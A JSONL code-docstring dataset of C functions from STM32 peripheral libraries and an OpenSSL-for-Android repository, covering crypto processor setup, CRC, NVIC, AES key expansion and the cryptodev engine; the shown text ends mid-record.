{"docstring": "/**\n  * @brief  Fills each CRYP_InitStruct member with its default value.\n  * @param  CRYP_InitStruct: pointer to a CRYP_InitTypeDef structure which will\n  *         be initialized.\n  * @retval None\n  */\n", "func_signal": "void CRYP_StructInit(CRYP_InitTypeDef* CRYP_InitStruct)", "code": "{\n  /* Initialize the CRYP_AlgoDir member */\n  CRYP_InitStruct->CRYP_AlgoDir = CRYP_AlgoDir_Encrypt;\n\n  /* initialize the CRYP_AlgoMode member */\n  CRYP_InitStruct->CRYP_AlgoMode = CRYP_AlgoMode_TDES_ECB;\n\n  /* initialize the CRYP_DataType member */\n  CRYP_InitStruct->CRYP_DataType = CRYP_DataType_32b;\n  \n  /* Initialize the CRYP_KeySize member */\n  CRYP_InitStruct->CRYP_KeySize = CRYP_KeySize_128b;\n}", "path": "stm32f4-discovery\\lib\\src\\peripherals\\stm32f4xx_cryp.c", "repo_name": "jeremyherbert/stm32-templates", "stars": 66, "license": "None", "language": "c", "size": 765}
{"docstring": "/**\n  * @brief  Initializes the CRYP Keys according to the specified parameters in\n  *         the CRYP_KeyInitStruct.\n  * @param  CRYP_KeyInitStruct: pointer to a CRYP_KeyInitTypeDef structure that\n  *         contains the configuration information for the CRYP Keys.\n  * @retval None\n  */\n", "func_signal": "void CRYP_KeyInit(CRYP_KeyInitTypeDef* CRYP_KeyInitStruct)", "code": "{\n  /* Key Initialisation */\n  CRYP->K0LR = CRYP_KeyInitStruct->CRYP_Key0Left;\n  CRYP->K0RR = CRYP_KeyInitStruct->CRYP_Key0Right;\n  CRYP->K1LR = CRYP_KeyInitStruct->CRYP_Key1Left;\n  CRYP->K1RR = CRYP_KeyInitStruct->CRYP_Key1Right;\n  CRYP->K2LR = CRYP_KeyInitStruct->CRYP_Key2Left;\n  CRYP->K2RR = CRYP_KeyInitStruct->CRYP_Key2Right;\n  CRYP->K3LR = CRYP_KeyInitStruct->CRYP_Key3Left;\n  CRYP->K3RR = CRYP_KeyInitStruct->CRYP_Key3Right;\n}", "path": "stm32f4-discovery\\lib\\src\\peripherals\\stm32f4xx_cryp.c", "repo_name": "jeremyherbert/stm32-templates", "stars": 66, "license": "None", "language": "c", "size": 765}
{"docstring": "/**\n  * @brief  Enables or disables the CRYP peripheral.\n  * @param  NewState: new state of the CRYP peripheral.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void CRYP_Cmd(FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n\n  if (NewState != DISABLE)\n  {\n    /* Enable the Cryptographic processor */\n    CRYP->CR |= CRYP_CR_CRYPEN;\n  }\n  else\n  {\n    /* Disable the Cryptographic processor */\n    CRYP->CR &= ~CRYP_CR_CRYPEN;\n  }\n}", "path": "stm32f4-discovery\\lib\\src\\peripherals\\stm32f4xx_cryp.c", "repo_name": "jeremyherbert/stm32-templates", "stars": 66, "license": "None", "language": "c", "size": 765}
{"docstring": "/**\n  * @brief  Initializes the NVIC peripheral according to the specified\n  *   parameters in the NVIC_InitStruct.\n  * @param  NVIC_InitStruct: pointer to a NVIC_InitTypeDef structure that contains\n  *   the configuration information for the specified NVIC peripheral.\n  * @retval None\n  */\n", "func_signal": "void NVIC_Init(NVIC_InitTypeDef* NVIC_InitStruct)", "code": "{\n  uint32_t tmppriority = 0x00, tmppre = 0x00, tmpsub = 0x0F;\n  \n  /* Check the parameters */\n  assert_param(IS_FUNCTIONAL_STATE(NVIC_InitStruct->NVIC_IRQChannelCmd));\n  assert_param(IS_NVIC_PREEMPTION_PRIORITY(NVIC_InitStruct->NVIC_IRQChannelPreemptionPriority));  \n  assert_param(IS_NVIC_SUB_PRIORITY(NVIC_InitStruct->NVIC_IRQChannelSubPriority));\n    \n  if (NVIC_InitStruct->NVIC_IRQChannelCmd != DISABLE)\n  {\n    /* Compute the Corresponding IRQ Priority --------------------------------*/    \n    tmppriority = (0x700 - ((SCB->AIRCR) & (uint32_t)0x700))>> 0x08;\n    tmppre = (0x4 - tmppriority);\n    tmpsub = tmpsub >> tmppriority;\n\n    tmppriority = (uint32_t)NVIC_InitStruct->NVIC_IRQChannelPreemptionPriority << tmppre;\n    tmppriority |=  NVIC_InitStruct->NVIC_IRQChannelSubPriority & tmpsub;\n    tmppriority = tmppriority << 0x04;\n        \n    NVIC->IP[NVIC_InitStruct->NVIC_IRQChannel] = tmppriority;\n    \n    /* Enable the Selected IRQ Channels --------------------------------------*/\n    NVIC->ISER[NVIC_InitStruct->NVIC_IRQChannel >> 0x05] =\n      (uint32_t)0x01 << (NVIC_InitStruct->NVIC_IRQChannel & (uint8_t)0x1F);\n  }\n  else\n  {\n    /* Disable the Selected IRQ Channels -------------------------------------*/\n    NVIC->ICER[NVIC_InitStruct->NVIC_IRQChannel >> 0x05] =\n      (uint32_t)0x01 << (NVIC_InitStruct->NVIC_IRQChannel & (uint8_t)0x1F);\n  }\n}", "path": "stm32vl-discovery\\lib\\src\\peripherals\\misc.c", "repo_name": "jeremyherbert/stm32-templates", "stars": 66, "license": "None", "language": "c", "size": 765}
{"docstring": "/**\n  * @brief  This function handles Bus Fault exception.\n  * @param  None\n  * @retval None\n  */\n", "func_signal": "void BusFault_Handler(void)", "code": "{\n  /* Go to infinite loop when Bus Fault exception occurs */\n  while (1)\n  {\n  }\n}", "path": "stm32vl-discovery\\src\\stm32f10x_it.c", "repo_name": "jeremyherbert/stm32-templates", "stars": 66, "license": "None", "language": "c", "size": 765}
{"docstring": "/**\n  * @brief  Computes the 32-bit CRC of a given buffer of data word(32-bit).\n  * @param  pBuffer: pointer to the buffer containing the data to be computed\n  * @param  BufferLength: length of the buffer to be computed\t\t\t\t\t\n  * @retval 32-bit CRC\n  */\n", "func_signal": "uint32_t CRC_CalcBlockCRC(uint32_t pBuffer[], uint32_t BufferLength)", "code": "{\n  uint32_t index = 0;\n  \n  for(index = 0; index < BufferLength; index++)\n  {\n    CRC->DR = pBuffer[index];\n  }\n  return (CRC->DR);\n}", "path": "stm32vl-discovery\\lib\\src\\peripherals\\stm32f10x_crc.c", "repo_name": "jeremyherbert/stm32-templates", "stars": 66, "license": "None", "language": "c", "size": 765}
{"docstring": "/**\n  * @brief  Computes the 32-bit CRC of a given data word(32-bit).\n  * @param  Data: data word(32-bit) to compute its CRC\n  * @retval 32-bit CRC\n  */\n", "func_signal": "uint32_t CRC_CalcCRC(uint32_t Data)", "code": "{\n  CRC->DR = Data;\n  \n  return (CRC->DR);\n}", "path": "stm32vl-discovery\\lib\\src\\peripherals\\stm32f10x_crc.c", "repo_name": "jeremyherbert/stm32-templates", "stars": 66, "license": "None", "language": "c", "size": 765}
{"docstring": "/**\n  * @brief  Fills each CRYP_KeyInitStruct member with its default value.\n  * @param  CRYP_KeyInitStruct: pointer to a CRYP_KeyInitTypeDef structure \n  *         which will be initialized.\n  * @retval None\n  */\n", "func_signal": "void CRYP_KeyStructInit(CRYP_KeyInitTypeDef* CRYP_KeyInitStruct)", "code": "{\n  CRYP_KeyInitStruct->CRYP_Key0Left  = 0;\n  CRYP_KeyInitStruct->CRYP_Key0Right = 0;\n  CRYP_KeyInitStruct->CRYP_Key1Left  = 0;\n  CRYP_KeyInitStruct->CRYP_Key1Right = 0;\n  CRYP_KeyInitStruct->CRYP_Key2Left  = 0;\n  CRYP_KeyInitStruct->CRYP_Key2Right = 0;\n  CRYP_KeyInitStruct->CRYP_Key3Left  = 0;\n  CRYP_KeyInitStruct->CRYP_Key3Right = 0;\n}", "path": "stm32f4-discovery\\lib\\src\\peripherals\\stm32f4xx_cryp.c", "repo_name": "jeremyherbert/stm32-templates", "stars": 66, "license": "None", "language": "c", "size": 765}
{"docstring": "/**\n  * @brief  Restores the CRYP peripheral Context.\n  * @note   Since teh DMA transfer is stopped in CRYP_SaveContext() function,\n  *         after restoring the context, you have to enable the DMA again (if the\n  *         DMA was previously used).  \n  * @param  CRYP_ContextRestore: pointer to a CRYP_Context structure that contains\n  *         the repository for saved context.\n  * @note   The data that were saved during context saving must be rewrited into\n  *         the IN FIFO.\n  * @retval None\n  */\n", "func_signal": "void CRYP_RestoreContext(CRYP_Context* CRYP_ContextRestore)", "code": "{\n\n  /* Configure the processor with the saved configuration */\n  CRYP->CR = CRYP_ContextRestore->CR_bits9to2;\n\n  /* restore The key value */\n  CRYP->K0LR = CRYP_ContextRestore->CRYP_K0LR; \n  CRYP->K0RR = CRYP_ContextRestore->CRYP_K0RR;\n  CRYP->K1LR = CRYP_ContextRestore->CRYP_K1LR;\n  CRYP->K1RR = CRYP_ContextRestore->CRYP_K1RR;\n  CRYP->K2LR = CRYP_ContextRestore->CRYP_K2LR;\n  CRYP->K2RR = CRYP_ContextRestore->CRYP_K2RR;\n  CRYP->K3LR = CRYP_ContextRestore->CRYP_K3LR;\n  CRYP->K3RR = CRYP_ContextRestore->CRYP_K3RR;\n\n  /* and the initialization vectors. */\n  CRYP->IV0LR = CRYP_ContextRestore->CRYP_IV0LR;\n  CRYP->IV0RR = CRYP_ContextRestore->CRYP_IV0RR;\n  CRYP->IV1LR = CRYP_ContextRestore->CRYP_IV1LR;\n  CRYP->IV1RR = CRYP_ContextRestore->CRYP_IV1RR;\n\n  /* Enable the cryptographic processor */\n  CRYP->CR |= CRYP_CR_CRYPEN;\n}", "path": "stm32f4-discovery\\lib\\src\\peripherals\\stm32f4xx_cryp.c", "repo_name": "jeremyherbert/stm32-templates", "stars": 66, "license": "None", "language": "c", "size": 765}
{"docstring": "/**\n  * @brief  Checks whether the specified CRYP flag is set or not.\n  * @param  CRYP_FLAG: specifies the CRYP flag to check.\n  *          This parameter can be one of the following values:\n  *            @arg CRYP_FLAG_IFEM: Input FIFO Empty flag.\n  *            @arg CRYP_FLAG_IFNF: Input FIFO Not Full flag.\n  *            @arg CRYP_FLAG_OFNE: Output FIFO Not Empty flag.\n  *            @arg CRYP_FLAG_OFFU: Output FIFO Full flag.\n  *            @arg CRYP_FLAG_BUSY: Busy flag.\n  *            @arg CRYP_FLAG_OUTRIS: Output FIFO raw interrupt flag.\n  *            @arg CRYP_FLAG_INRIS: Input FIFO raw interrupt flag.\n  * @retval The new state of CRYP_FLAG (SET or RESET).\n  */\n", "func_signal": "FlagStatus CRYP_GetFlagStatus(uint8_t CRYP_FLAG)", "code": "{\n  FlagStatus bitstatus = RESET;\n  uint32_t tempreg = 0;\n\n  /* Check the parameters */\n  assert_param(IS_CRYP_GET_FLAG(CRYP_FLAG));\n\n  /* check if the FLAG is in RISR register */\n  if ((CRYP_FLAG & FLAG_MASK) != 0x00) \n  {\n    tempreg = CRYP->RISR;\n  }\n  else  /* The FLAG is in SR register */\n  {\n    tempreg = CRYP->SR;\n  }\n\n\n  /* Check the status of the specified CRYP flag */\n  if ((tempreg & CRYP_FLAG ) != (uint8_t)RESET)\n  {\n    /* CRYP_FLAG is set */\n    bitstatus = SET;\n  }\n  else\n  {\n    /* CRYP_FLAG is reset */\n    bitstatus = RESET;\n  }\n\n  /* Return the CRYP_FLAG status */\n  return  bitstatus;\n}", "path": "stm32f4-discovery\\lib\\src\\peripherals\\stm32f4xx_cryp.c", "repo_name": "jeremyherbert/stm32-templates", "stars": 66, "license": "None", "language": "c", "size": 765}
{"docstring": "/**\n  * @brief  Computes the 32-bit CRC of a given data word(32-bit).\n  * @param  Data: data word(32-bit) to compute its CRC\n  * @retval 32-bit CRC\n  */\n", "func_signal": "uint32_t CRC_CalcCRC(uint32_t Data)", "code": "{\n  CRC->DR = Data;\n  \n  return (CRC->DR);\n}", "path": "stm32f4-discovery\\lib\\src\\peripherals\\stm32f4xx_crc.c", "repo_name": "jeremyherbert/stm32-templates", "stars": 66, "license": "None", "language": "c", "size": 765}
{"docstring": "/**\n  * @brief  Computes the 32-bit CRC of a given buffer of data word(32-bit).\n  * @param  pBuffer: pointer to the buffer containing the data to be computed\n  * @param  BufferLength: length of the buffer to be computed\t\t\t\t\t\n  * @retval 32-bit CRC\n  */\n", "func_signal": "uint32_t CRC_CalcBlockCRC(uint32_t pBuffer[], uint32_t BufferLength)", "code": "{\n  uint32_t index = 0;\n  \n  for(index = 0; index < BufferLength; index++)\n  {\n    CRC->DR = pBuffer[index];\n  }\n  return (CRC->DR);\n}", "path": "stm32f4-discovery\\lib\\src\\peripherals\\stm32f4xx_crc.c", "repo_name": "jeremyherbert/stm32-templates", "stars": 66, "license": "None", "language": "c", "size": 765}
{"docstring": "/**\n  * @brief  This function handles Hard Fault exception.\n  * @param  None\n  * @retval None\n  */\n", "func_signal": "void HardFault_Handler(void)", "code": "{\n  /* Go to infinite loop when Hard Fault exception occurs */\n  while (1)\n  {\n  }\n}", "path": "stm32vl-discovery\\src\\stm32f10x_it.c", "repo_name": "jeremyherbert/stm32-templates", "stars": 66, "license": "None", "language": "c", "size": 765}
{"docstring": "/**\n  * @brief  Checks whether the specified CRYP interrupt has occurred or not.\n  * @note   This function checks the status of the masked interrupt (i.e the \n  *         interrupt should be previously enabled).     \n  * @param  CRYP_IT: specifies the CRYP (masked) interrupt source to check.\n  *           This parameter can be one of the following values:\n  *            @arg CRYP_IT_INI: Input FIFO interrupt\n  *            @arg CRYP_IT_OUTI: Output FIFO interrupt\n  * @retval The new state of CRYP_IT (SET or RESET).\n  */\n", "func_signal": "ITStatus CRYP_GetITStatus(uint8_t CRYP_IT)", "code": "{\n  ITStatus bitstatus = RESET;\n  /* Check the parameters */\n  assert_param(IS_CRYP_GET_IT(CRYP_IT));\n\n  /* Check the status of the specified CRYP interrupt */\n  if ((CRYP->MISR &  CRYP_IT) != (uint8_t)RESET)\n  {\n    /* CRYP_IT is set */\n    bitstatus = SET;\n  }\n  else\n  {\n    /* CRYP_IT is reset */\n    bitstatus = RESET;\n  }\n  /* Return the CRYP_IT status */\n  return bitstatus;\n}", "path": "stm32f4-discovery\\lib\\src\\peripherals\\stm32f4xx_cryp.c", "repo_name": "jeremyherbert/stm32-templates", "stars": 66, "license": "None", "language": "c", "size": 765}
{"docstring": "/**\n  * @brief  Sets the vector table location and Offset.\n  * @param  NVIC_VectTab: specifies if the vector table is in RAM or FLASH memory.\n  *   This parameter can be one of the following values:\n  *     @arg NVIC_VectTab_RAM\n  *     @arg NVIC_VectTab_FLASH\n  * @param  Offset: Vector Table base offset field. This value must be a multiple of 0x100.\n  * @retval None\n  */\n", "func_signal": "void NVIC_SetVectorTable(uint32_t NVIC_VectTab, uint32_t Offset)", "code": "{ \n  /* Check the parameters */\n  assert_param(IS_NVIC_VECTTAB(NVIC_VectTab));\n  assert_param(IS_NVIC_OFFSET(Offset));  \n   \n  SCB->VTOR = NVIC_VectTab | (Offset & (uint32_t)0x1FFFFF80);\n}", "path": "stm32vl-discovery\\lib\\src\\peripherals\\misc.c", "repo_name": "jeremyherbert/stm32-templates", "stars": 66, "license": "None", "language": "c", "size": 765}
{"docstring": "/* convert digest type to cryptodev */\n", "func_signal": "static int\ndigest_nid_to_cryptodev(int nid)", "code": "{\n\tint i;\n\n\tfor (i = 0; digests[i].id; i++)\n\t\tif (digests[i].nid == nid)\n\t\t\treturn (digests[i].id);\n\treturn (0);\n}", "path": "crypto\\engine\\eng_cryptodev.c", "repo_name": "eighthave/openssl-android", "stars": 78, "license": "other", "language": "c", "size": 6493}
{"docstring": "/**\n * Expand the cipher key into the encryption key schedule.\n */\n", "func_signal": "int AES_set_encrypt_key(const unsigned char *userKey, const int bits,\n\t\t\tAES_KEY *key)", "code": "{\n\n\tu32 *rk;\n   \tint i = 0;\n\tu32 temp;\n\n\tif (!userKey || !key)\n\t\treturn -1;\n\tif (bits != 128 && bits != 192 && bits != 256)\n\t\treturn -2;\n\n\trk = key->rd_key;\n\n\tif (bits==128)\n\t\tkey->rounds = 10;\n\telse if (bits==192)\n\t\tkey->rounds = 12;\n\telse\n\t\tkey->rounds = 14;\n\n\trk[0] = GETU32(userKey     );\n\trk[1] = GETU32(userKey +  4);\n\trk[2] = GETU32(userKey +  8);\n\trk[3] = GETU32(userKey + 12);\n\tif (bits == 128) {\n\t\twhile (1) {\n\t\t\ttemp  = rk[3];\n\t\t\trk[4] = rk[0] ^\n\t\t\t\t(Te4[(temp >>  8) & 0xff]      ) ^\n\t\t\t\t(Te4[(temp >> 16) & 0xff] <<  8) ^\n\t\t\t\t(Te4[(temp >> 24)       ] << 16) ^\n\t\t\t\t(Te4[(temp      ) & 0xff] << 24) ^\n\t\t\t\trcon[i];\n\t\t\trk[5] = rk[1] ^ rk[4];\n\t\t\trk[6] = rk[2] ^ rk[5];\n\t\t\trk[7] = rk[3] ^ rk[6];\n\t\t\tif (++i == 10) {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\trk += 4;\n\t\t}\n\t}\n\trk[4] = GETU32(userKey + 16);\n\trk[5] = GETU32(userKey + 20);\n\tif (bits == 192) {\n\t\twhile (1) {\n\t\t\ttemp = rk[ 5];\n\t\t\trk[ 6] = rk[ 0] ^\n\t\t\t\t(Te4[(temp >>  8) & 0xff]      ) ^\n\t\t\t\t(Te4[(temp >> 16) & 0xff] <<  8) ^\n\t\t\t\t(Te4[(temp >> 24)       ] << 16) ^\n\t\t\t\t(Te4[(temp      ) & 0xff] << 24) ^\n\t\t\t\trcon[i];\n\t\t\trk[ 7] = rk[ 1] ^ rk[ 6];\n\t\t\trk[ 8] = rk[ 2] ^ rk[ 7];\n\t\t\trk[ 9] = rk[ 3] ^ rk[ 8];\n\t\t\tif (++i == 8) {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\trk[10] = rk[ 4] ^ rk[ 9];\n\t\t\trk[11] = rk[ 5] ^ rk[10];\n\t\t\trk += 6;\n\t\t}\n\t}\n\trk[6] = GETU32(userKey + 24);\n\trk[7] = GETU32(userKey + 28);\n\tif (bits == 256) {\n\t\twhile (1) {\n\t\t\ttemp = rk[ 7];\n\t\t\trk[ 8] = rk[ 0] ^\n\t\t\t\t(Te4[(temp >>  8) & 0xff]      ) ^\n\t\t\t\t(Te4[(temp >> 16) & 0xff] <<  8) ^\n\t\t\t\t(Te4[(temp >> 24)       ] << 16) ^\n\t\t\t\t(Te4[(temp      ) & 0xff] << 24) ^\n\t\t\t\trcon[i];\n\t\t\trk[ 9] = rk[ 1] ^ rk[ 8];\n\t\t\trk[10] = rk[ 2] ^ rk[ 9];\n\t\t\trk[11] = rk[ 3] ^ rk[10];\n\t\t\tif (++i == 7) {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\ttemp = rk[11];\n\t\t\trk[12] = rk[ 4] ^\n\t\t\t\t(Te4[(temp      ) & 0xff]      ) ^\n\t\t\t\t(Te4[(temp >>  8) & 0xff] <<  8) ^\n\t\t\t\t(Te4[(temp >> 16) & 0xff] << 16) ^\n\t\t\t\t(Te4[(temp >> 24)       ] << 24);\n\t\t\trk[13] = rk[ 5] ^ rk[12];\n\t\t\trk[14] = rk[ 6] ^ rk[13];\n\t\t\trk[15] = rk[ 7] ^ rk[14];\n\n\t\t\trk += 8;\n        \t}\n\t}\n\treturn 0;\n}", "path": "crypto\\aes\\aes_x86core.c", "repo_name": "eighthave/openssl-android", "stars": 78, "license": "other", "language": "c", "size": 6493}
{"docstring": "/*\n * Return a fd if /dev/crypto seems usable, 0 otherwise.\n */\n", "func_signal": "static int\nopen_dev_crypto(void)", "code": "{\n\tstatic int fd = -1;\n\n\tif (fd == -1) {\n\t\tif ((fd = open(\"/dev/crypto\", O_RDWR, 0)) == -1)\n\t\t\treturn (-1);\n\t\t/* close on exec */\n\t\tif (fcntl(fd, F_SETFD, 1) == -1) {\n\t\t\tclose(fd);\n\t\t\tfd = -1;\n\t\t\treturn (-1);\n\t\t}\n\t}\n\treturn (fd);\n}", "path": "crypto\\engine\\eng_cryptodev.c", "repo_name": "eighthave/openssl-android", "stars": 78, "license": "other", "language": "c", "size": 6493}
{"docstring": "/* Although we have a CFB-r implementation for 3-DES, it doesn't pack the right\n   way, so wrap it here */\n", "func_signal": "static int des_ede3_cfb1_cipher(EVP_CIPHER_CTX *ctx, unsigned char *out,\n\t\t\t\tconst unsigned char *in, size_t inl)", "code": "{\n    size_t n;\n    unsigned char c[1],d[1];\n\n    for(n=0 ; n < inl ; ++n)\n\t{\n\tc[0]=(in[n/8]&(1 << (7-n%8))) ? 0x80 : 0;\n\tDES_ede3_cfb_encrypt(c,d,1,1,\n\t\t\t     &data(ctx)->ks1,&data(ctx)->ks2,&data(ctx)->ks3,\n\t\t\t     (DES_cblock *)ctx->iv,ctx->encrypt);\n\tout[n/8]=(out[n/8]&~(0x80 >> (unsigned int)(n%8))) |\n\t\t ((d[0]&0x80) >> (unsigned int)(n%8));\n\t}\n\n    return 1;\n    }\n\nstatic int des_ede3_cfb8_cipher(EVP_CIPHER_CTX *ctx, unsigned char *out,\n\t\t\t\tconst unsigned char *in, size_t inl)\n    {\n    while (inl>=EVP_MAXCHUNK)\n\t{\n\tDES_ede3_cfb_encrypt(in,out,8,(long)EVP_MAXCHUNK,\n\t\t\t &data(ctx)->ks1,&data(ctx)->ks2,&data(ctx)->ks3,\n\t\t\t (DES_cblock *)ctx->iv,ctx->encrypt);\n\tinl-=EVP_MAXCHUNK;\n\tin +=EVP_MAXCHUNK;\n\tout+=EVP_MAXCHUNK;\n\t}\n    if (inl)\n\tDES_ede3_cfb_encrypt(in,out,8,(long)inl,\n\t\t\t&data(ctx)->ks1,&data(ctx)->ks2,&data(ctx)->ks3,\n\t\t\t(DES_cblock *)ctx->iv,ctx->encrypt);\n    return 1;\n    }\n\nBLOCK_CIPHER_defs(des_ede, DES_EDE_KEY, NID_des_ede, 8, 16, 8, 64,\n\t\t\tEVP_CIPH_RAND_KEY, des_ede_init_key, NULL, \n\t\t\tEVP_CIPHER_set_asn1_iv,\n\t\t\tEVP_CIPHER_get_asn1_iv,\n\t\t\tdes3_ctrl)\n\n#define des_ede3_cfb64_cipher des_ede_cfb64_cipher\n#define des_ede3_ofb_cipher des_ede_ofb_cipher\n#define des_ede3_cbc_cipher des_ede_cbc_cipher\n#define des_ede3_ecb_cipher des_ede_ecb_cipher\n\nBLOCK_CIPHER_defs(des_ede3, DES_EDE_KEY, NID_des_ede3, 8, 24, 8, 64,\n\t\t\tEVP_CIPH_RAND_KEY, des_ede3_init_key, NULL, \n\t\t\tEVP_CIPHER_set_asn1_iv,\n\t\t\tEVP_CIPHER_get_asn1_iv,\n\t\t\tdes3_ctrl)\n\nBLOCK_CIPHER_def_cfb(des_ede3,DES_EDE_KEY,NID_des_ede3,24,8,1,\n\t\t     EVP_CIPH_RAND_KEY, des_ede3_init_key,NULL,\n\t\t     EVP_CIPHER_set_asn1_iv,\n\t\t     EVP_CIPHER_get_asn1_iv,\n\t\t     des3_ctrl)\n\nBLOCK_CIPHER_def_cfb(des_ede3,DES_EDE_KEY,NID_des_ede3,24,8,8,\n\t\t     EVP_CIPH_RAND_KEY, des_ede3_init_key,NULL,\n\t\t     EVP_CIPHER_set_asn1_iv,\n\t\t     EVP_CIPHER_get_asn1_iv,\n\t\t     des3_ctrl)\n\nstatic int des_ede_init_key(EVP_CIPHER_CTX *ctx, const unsigned char *key,\n\t\t\t    const unsigned char *iv, int enc)\n\t{\n\tDES_cblock *deskey = (DES_cblock *)key;\n#ifdef EVP_CHECK_DES_KEY\n\tif (DES_set_key_checked(&deskey[0],&data(ctx)->ks1)\n\t\t!! DES_set_key_checked(&deskey[1],&data(ctx)->ks2))\n\t\treturn 0;\n#else\n\tDES_set_key_unchecked(&deskey[0],&data(ctx)->ks1);\n\tDES_set_key_unchecked(&deskey[1],&data(ctx)->ks2);\n#endif\n\tmemcpy(&data(ctx)->ks3,&data(ctx)->ks1,\n\t       sizeof(data(ctx)->ks1));\n\treturn 1;\n\t}\n\nstatic int des_ede3_init_key(EVP_CIPHER_CTX *ctx, const unsigned char *key,\n\t\t\t     const unsigned char *iv, int enc)\n\t{\n\tDES_cblock *deskey = (DES_cblock *)key;\n#ifdef KSSL_DEBUG\n\t{\n        int i;\n        printf(\"des_ede3_init_key(ctx=%lx)\\n\", ctx);\n\tprintf(\"\\tKEY= \");\n        for(i=0;i<24;i++) printf(\"%02X\",key[i]); printf(\"\\n\");\n\tprintf(\"\\t IV= \");\n        for(i=0;i<8;i++) printf(\"%02X\",iv[i]); printf(\"\\n\");\n\t}\n#endif\t/* KSSL_DEBUG */\n\n#ifdef EVP_CHECK_DES_KEY\n\tif (DES_set_key_checked(&deskey[0],&data(ctx)->ks1)\n\t\t|| DES_set_key_checked(&deskey[1],&data(ctx)->ks2)\n\t\t|| DES_set_key_checked(&deskey[2],&data(ctx)->ks3))\n\t\treturn 0;\n#else\n\tDES_set_key_unchecked(&deskey[0],&data(ctx)->ks1);\n\tDES_set_key_unchecked(&deskey[1],&data(ctx)->ks2);\n\tDES_set_key_unchecked(&deskey[2],&data(ctx)->ks3);\n#endif\n\treturn 1;\n\t}\n\nstatic int des3_ctrl(EVP_CIPHER_CTX *c, int type, int arg, void *ptr)\n\t{\n\n\tDES_cblock *deskey = ptr;\n\n\tswitch(type)\n\t\t{\n\tcase EVP_CTRL_RAND_KEY:\n\t\tif (RAND_bytes(ptr, c->key_len) <= 0)\n\t\t\treturn 0;\n\t\tDES_set_odd_parity(deskey);\n\t\tif (c->key_len >= 16)\n\t\t\tDES_set_odd_parity(deskey + 1);\n\t\tif (c->key_len >= 24)\n\t\t\tDES_set_odd_parity(deskey + 2);\n\t\treturn 1;\n\n\tdefault:\n\t\treturn -1;\n\t\t}\n\t}\n\nconst EVP_CIPHER *EVP_des_ede(void)\n{\n\treturn &des_ede_ecb;\n}", "path": "crypto\\evp\\e_des3.c", "repo_name": "eighthave/openssl-android", "stars": 78, "license": "other", "language": "c", "size": 6493}
{"docstring": "/* This function sets the default to various \"flavours\" of configuration.\n * based on an ASCII string. Currently this is:\n * MASK:XXXX : a numerical mask value.\n * nobmp : Don't use BMPStrings (just Printable, T61).\n * pkix : PKIX recommendation in RFC2459.\n * utf8only : only use UTF8Strings (RFC2459 recommendation for 2004).\n * default:   the default value, Printable, T61, BMP.\n */\n", "func_signal": "int ASN1_STRING_set_default_mask_asc(char *p)", "code": "{\n\tunsigned long mask;\n\tchar *end;\n\tif(!strncmp(p, \"MASK:\", 5)) {\n\t\tif(!p[5]) return 0;\n\t\tmask = strtoul(p + 5, &end, 0);\n\t\tif(*end) return 0;\n\t} else if(!strcmp(p, \"nombstr\"))\n\t\t\t mask = ~((unsigned long)(B_ASN1_BMPSTRING|B_ASN1_UTF8STRING));\n\telse if(!strcmp(p, \"pkix\"))\n\t\t\tmask = ~((unsigned long)B_ASN1_T61STRING);\n\telse if(!strcmp(p, \"utf8only\")) mask = B_ASN1_UTF8STRING;\n\telse if(!strcmp(p, \"default\"))\n\t    mask = 0xFFFFFFFFL;\n\telse return 0;\n\tASN1_STRING_set_default_mask(mask);\n\treturn 1;\n}", "path": "crypto\\asn1\\a_strnid.c", "repo_name": "eighthave/openssl-android", "stars": 78, "license": "other", "language": "c", "size": 6493}
{"docstring": "/* Minor tweak to operation: zero private key data */\n", "func_signal": "static int pkey_cb(int operation, ASN1_VALUE **pval, const ASN1_ITEM *it,\n\t\t\t\t\t\t\tvoid *exarg)", "code": "{\n\t/* Since the structure must still be valid use ASN1_OP_FREE_PRE */\n\tif(operation == ASN1_OP_FREE_PRE) {\n\t\tPKCS8_PRIV_KEY_INFO *key = (PKCS8_PRIV_KEY_INFO *)*pval;\n\t\tif (key->pkey->value.octet_string)\n\t\tOPENSSL_cleanse(key->pkey->value.octet_string->data,\n\t\t\tkey->pkey->value.octet_string->length);\n\t}\n\treturn 1;\n}", "path": "crypto\\asn1\\p8_pkey.c", "repo_name": "eighthave/openssl-android", "stars": 78, "license": "other", "language": "c", "size": 6493}
{"docstring": "/* Convert a /dev/crypto parameter to a BIGNUM */\n", "func_signal": "static int\ncrparam2bn(struct crparam *crp, BIGNUM *a)", "code": "{\n\tu_int8_t *pd;\n\tint i, bytes;\n\n\tbytes = (crp->crp_nbits + 7) / 8;\n\n\tif (bytes == 0)\n\t\treturn (-1);\n\n\tif ((pd = (u_int8_t *) malloc(bytes)) == NULL)\n\t\treturn (-1);\n\n\tfor (i = 0; i < bytes; i++)\n\t\tpd[i] = crp->crp_p[bytes - i - 1];\n\n\tBN_bin2bn(pd, bytes, a);\n\tfree(pd);\n\n\treturn (0);\n}", "path": "crypto\\engine\\eng_cryptodev.c", "repo_name": "eighthave/openssl-android", "stars": 78, "license": "other", "language": "c", "size": 6493}
{"docstring": "/*\n * Registered by the ENGINE when used to find out how to deal with\n * a particular NID in the ENGINE. this says what we'll do at the\n * top level - note, that list is restricted by what we answer with\n */\n", "func_signal": "static int\ncryptodev_engine_ciphers(ENGINE *e, const EVP_CIPHER **cipher,\n    const int **nids, int nid)", "code": "{\n\tif (!cipher)\n\t\treturn (cryptodev_usable_ciphers(nids));\n\n\tswitch (nid) {\n\tcase NID_rc4:\n\t\t*cipher = &cryptodev_rc4;\n\t\tbreak;\n\tcase NID_des_ede3_cbc:\n\t\t*cipher = &cryptodev_3des_cbc;\n\t\tbreak;\n\tcase NID_des_cbc:\n\t\t*cipher = &cryptodev_des_cbc;\n\t\tbreak;\n\tcase NID_bf_cbc:\n\t\t*cipher = &cryptodev_bf_cbc;\n\t\tbreak;\n\tcase NID_cast5_cbc:\n\t\t*cipher = &cryptodev_cast_cbc;\n\t\tbreak;\n\tcase NID_aes_128_cbc:\n\t\t*cipher = &cryptodev_aes_cbc;\n\t\tbreak;\n\tcase NID_aes_192_cbc:\n\t\t*cipher = &cryptodev_aes_192_cbc;\n\t\tbreak;\n\tcase NID_aes_256_cbc:\n\t\t*cipher = &cryptodev_aes_256_cbc;\n\t\tbreak;\n\tdefault:\n\t\t*cipher = 